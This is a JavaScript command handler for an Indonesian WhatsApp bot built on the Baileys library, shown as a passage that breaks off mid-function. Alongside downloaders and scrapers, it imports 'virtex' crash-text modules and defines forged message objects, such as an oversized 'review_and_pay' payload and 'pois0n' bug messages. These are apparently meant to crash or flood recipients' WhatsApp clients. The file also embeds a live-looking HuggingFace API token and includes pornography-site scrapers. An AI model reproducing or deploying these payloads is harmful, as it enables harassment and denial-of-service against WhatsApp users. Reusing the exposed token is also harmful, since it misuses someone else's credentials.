/*
DI LARANG KERAS MENJUAL SCRIPT INI DILUAR SEPENGATAHUAN SAYA KALO KETAHUAN GW BUG KENON TANDAIN LU

RECODE? KASIH CREDIT GW : LynnZxD
RECODE : LynnZxD
BASE ORI : SlimexTzy

OWNER NO 6283167532721
JADI KALO MAU BUY V9 NY SILAHKAN 
BELI DI WA ATAS
*/
process.on('uncaughtException', console.error)
require('./setting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const speed = require('performance-now')
const axios = require('axios')
const fsx = require('fs-extra')
const mark = `0@s.whatsapp.net`
const dns = require('dns');
const FormData = require('form-data')
const gtts = require('node-gtts')
const ytdl = require("ytdl-core")
const { youtube } = require("btch-downloader")
const cheerio = require('cheerio');
const ms = require("ms");
const crypto = require('crypto')
const https = require('https')
const yts = require("yt-search")
const uploadImage = require('./lib/uploadImage')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { mediafireDl } = require('./database/mediafire.js')
const jsobfus = require('javascript-obfuscator')
const { exec, spawn, execSync } = require('child_process')
const { ngazap } = require('./SlimeMedia/virtex/ngazap')
const { buttonkal } = require('./SlimeMedia/virtex/buttonkal')
const { cttl } = require('./SlimeMedia/virtex/cttl')
const { tizi } = require('./SlimeMedia/virtex/tizi')
const { weg } = require('./SlimeMedia/virtex/weg')
const { virtex7 } = require('./SlimeMedia/virtex/virtex7')
const { ios } = require("./virtex/ios.js")
const { cerpen } = require('./lib/func_Cerpen');
const { TelegraPH } = require("./lib/TelegraPH")
const { uptotelegra } = require(`./upload`)
const { sswebDesktop, sswebTablet, sswebPhone } = require('./lib/ssweb')
const { pinterest, Tiktok, jarak, wallpaper, wikimedia, quotesAnime, aiovideodl, umma, ringtone, styletext } = require("./lib/scraper")
const LINODE_API_TOKEN = global.apilinode;
const API_TOKEN = global.apitokendo;
const moment = require('moment-timezone')
const { pickRandom, smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { 
getRegisteredRandomId, 
addRegisteredUser, 
createSerial, 
checkRegisteredUser 
} = require('./lib/register.js')
// read database
let tebakbom = []
let tebakgambar = []
let tebakkata = []
let _family100 = []
let tebakkabupaten = []
let tebaksusunkata = []
let tebakjkt48 = []
let tekateki = []
let tebaktebakan = []
let caklontong = []
let caklontong_desk = []
let siapaaku = []
let tebaklirik = []

const thumb = fs.readFileSync ('./SlimeMedia/image/slime.jpg')
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const pengguna = JSON.parse(fs.readFileSync('./SlimeMedia/dbnye/wihh.json'))
const prem = require("./lib/premium");
const anon = require('./lib/menfess') 
const { TelegraPh } = require('./lib/uploader')
const { antiSpam } = require('./lib/antispam')
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const xeonverifieduser = JSON.parse(fs.readFileSync('./SlimeMedia/dbnye/wihh.json'))
let ometv = JSON.parse(fs.readFileSync('./lib/ometv.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./SlimeMedia/dbnye/banned.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/enable/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/enable/antitoxic.json'));
let ntasing = JSON.parse(fs.readFileSync('./database/enable/antiasing.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/enable/antiwame.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/enable/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/enable/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/enable/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/enable/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/enable/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/enable/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/enable/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/enable/antilinkytvideo.json'));
    const { addSaldo, minSaldo, cekSaldo } = require("./lib/deposit");
let db_saldo = JSON.parse(fs.readFileSync("./lib/saldo.json"));
let depositPath = "./lib/deposit/"
const translate = require("@vitalets/google-translate-api");
const chatbot = JSON.parse(fs.readFileSync("./lib/chatbot.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const fakedoc = fs.readFileSync(`./src/pk/bruhhh.apk`)
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
//
//==================================================//
module.exports = slime = async (slime, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

//WM By LynnZxD, Titenono lek ko hapus le😹
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
//=================================================//

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"

    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
//=================================================//

const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
//isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const botNumber = await slime.decodeJid(slime.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await slime.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : true
const welcmm = m.isGroup ? wlcmm.includes(from) : true
const AntiLink = m.isGroup ? ntilink.includes(from) : true
const Jpm = m.isGroup ? ntilink.includes(from) : false 
const isBan = banned.includes(m.sender)
const isRegistered = checkRegisteredUser(m.sender)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
//const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
//
const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363325328533494@newsletter',
    newsletterName: '',
    caption: body
}}}
//
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var stime = Styles(`Good Night`)
 }
 if(time2 < "19:00:00"){
var stime = Styles(`Good Evening`)
 }
 if(time2 < "18:00:00"){
var stime = Styles(`Good Evening`)
 }
 if(time2 < "15:00:00"){
var stime = Styles(`Good Afternoon`)
 }
 if(time2 < "11:00:00"){
var stime = Styles(`Good Morning`)
 }
 if(time2 < "05:00:00"){
var stime = Styles(`Good Morning`)
 }
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	
const qtod = m.quoted? "true":"false"
const bii = JSON.parse(fs.readFileSync('./SlimeMedia/dbnye/wihh.json').toString())
const isSeler = [botNumber, ...bii].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const jangan = m.isGroup ? ntilink.includes(m.chat) : false
const AntiVirtex = m.isGroup ? ntvirtex.includes(from) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const AntiWame = m.isGroup ? ntwame.includes(from) : false
//const AntiToxic = m.isGroup ? nttoxic.includes(from) : false
const AntiAsing = m.isGroup ? ntasing.includes(from) : false
const ChatBot = m.isGroup ? chatbot.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const antibot = true 
//Const
const cap = '${botname}'
//=================================================//

const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

const reply = async(teks) => {slime.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}


slime.autoshalat = slime.autoshalat ? slime.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? slime.user.id : m.sender
	let id = m.chat 
    if(id in slime.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai Kak ${pushname},\nWaktu *${sholat}* Telah Tiba, Ambilah Air Wudhu Dan Segeralah Shalat😇.\n\n*${waktu}*\n_Untuk Wilayah Jakarta Dan Sekitarnya._`
    slime.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete slime.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }

const totalFitur = () =>{
            var mytext = fs.readFileSync("./hanako.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
      

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

//*[ PLAY/AUDIO/VIDEO FEATURES ]*

async function downloadMp3 (link) {
try {
slime.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
slime.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
slime.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
slime.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

 


              
              
//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./SlimeMedia/image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

async function text2img(data) {
  const response = await fetch(
    "https://api-inference.huggingface.co/models/Yntec/Ninja-Diffusers",
    {
      headers: { Authorization: "Bearer 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" },
      method: "POST",
      body: JSON.stringify(data),
    }
  );
  const result = await response.blob();
  return result;
}
//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🌠 ZxV Client - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const slimereqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const slimevoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const slimebug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - zxv`
}
}
}

const slimebut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - zxv',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const slimecakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363325328533494@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` ZxV - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}

async function igdl2(url) {
            let res = await axios("https://indown.io/");
            let _$ = cheerio.load(res.data);
            let referer = _$("input[name=referer]").val();
            let locale = _$("input[name=locale]").val();
            let _token = _$("input[name=_token]").val();
            let { data } = await axios.post(
              "https://indown.io/download",
              new URLSearchParams({
                link: url,
                referer,
                locale,
                _token,
              }),
              {
                headers: {
                  cookie: res.headers["set-cookie"].join("; "),
                },
              }
            );
            let $ = cheerio.load(data);
            let result = [];
            let __$ = cheerio.load($("#result").html());
            __$("video").each(function () {
              let $$ = $(this);
              result.push({
                type: "video",
                thumbnail: $$.attr("poster"),
                url: $$.find("source").attr("src"),
              });
            });
            __$("img").each(function () {
              let $$ = $(this);
              result.push({
                type: "image",
                url: $$.attr("src"),
              });
            });
          
            return result;
          }
          
                      const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}


//

//
async function ytdlnew(videoUrl) {
    return new Promise(async (resolve, reject) => {
        try {
            const searchParams = new URLSearchParams();
            searchParams.append('query', videoUrl);
            searchParams.append('vt', 'mp3');
            const searchResponse = await axios.post(
                'https://tomp3.cc/api/ajax/search',
                searchParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (searchResponse.data.status !== 'ok') {
                throw new Error('Failed to search for the video.');
            }            
            const videoId = searchResponse.data.vid;
            const videoTitle = searchResponse.data.title;
            const mp4Options = searchResponse.data.links.mp4;
            const mp3Options = searchResponse.data.links.mp3;
            const mediumQualityMp4Option = mp4Options[136]; 
            const mp3Option = mp3Options['mp3128']; 
            const mp4ConvertParams = new URLSearchParams();
            mp4ConvertParams.append('vid', videoId);
            mp4ConvertParams.append('k', mediumQualityMp4Option.k);
            const mp4ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp4ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp4ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP4.');
            }
            const mp4DownloadLink = mp4ConvertResponse.data.dlink;
            const mp3ConvertParams = new URLSearchParams();
            mp3ConvertParams.append('vid', videoId);
            mp3ConvertParams.append('k', mp3Option.k);
            const mp3ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp3ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp3ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP3.');
            }
            const mp3DownloadLink = mp3ConvertResponse.data.dlink;
            resolve({
                title: videoTitle,
                mp4DownloadLink,
                mp3DownloadLink
            });
        } catch (error) {
            reject('Error: ' + error.message);
        }
    });
 }
 //
// AUTO DOWNLOAD YOUTUBE SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`youtube.com|youtu.be`)) {
let lodingdonlod = `*[ Loaded ]* downloaded from the link`
const slimevido = require('./lib/ytdl2')
const vido=await slimevido.mp4(budy)
downloadMp3(budy)
const autod=`*Tittle:* ${vido.title}\n*Date:* ${vido.date}\n*Duration:* ${vido.duration}\n*Quality:* ${vido.quality}`
await slime.sendMessage(m.chat,{ video: {url:vido.videoUrl}, caption: autod },{quoted:m})
}

// AUTO DOWNLOAD TIKTOK SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`tiktok.com`)){
reply('memuat..')
await Tiktok(budy).then(async resi => {
let taev = `Title : ${resi.title}
Author : ${resi.author}`
await slime.sendMessage(from, {audio: {url: resi.audio}, mimetype: 'audio/mpeg', ptt: false})
await slime.sendMessage(from, {video: {url: resi.nowm}, caption: taev})
}).catch((err) => reply('Maaf erjadi Kesalahan!')) // pengalih isu
}

async function sendPoll(jid, text, list) {
slime.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}    

async function searchVideo(query) {
  const url = `https://www.pornhub.com/video/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const videoList = [];

  $('li[data-video-segment]').each((index, element) => {
    const $element = $(element);
    
    const link = $element.find('.title a').attr('href').trim();
    const title = $element.find('.title a').text().trim();
    const uploader = $element.find('.videoUploaderBlock a').text().trim();
    const views = $element.find('.views').text().trim();
    const duration = $element.find('.duration').text().trim();
    
    const videoData = {
      link: "https://www.pornhub.com" + link,
      title: title,
      uploader: uploader,
      views: views,
      duration: duration
    };
    
    videoList.push(videoData);
  });
  
  return videoList;
}

async function searchGif(query) {
  const url = `http://www.pornhub.com/gifs/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const gifs = $('ul.gifs.gifLink li');

    return gifs.map((i, gif) => {
      const data = $(gif).find('a');

      return {
        title: data.find('span').text(),
        url: 'http://dl.phncdn.com#id#.gif'.replace('#id#', data.attr('href')),
        webm: data.find('video').attr('data-webm'),
      };
    }).get();
}

// FUNCTION DOWNLOAD HENTAI SFM
async function hentaivid() {
return new Promise((resolve, reject) => {
const page = Math.floor(Math.random() * 1153)
axios.get('https://sfmcompile.club/page/'+page)
.then((data) => {
const $ = cheerio.load(data.data)
const hasil2 = []
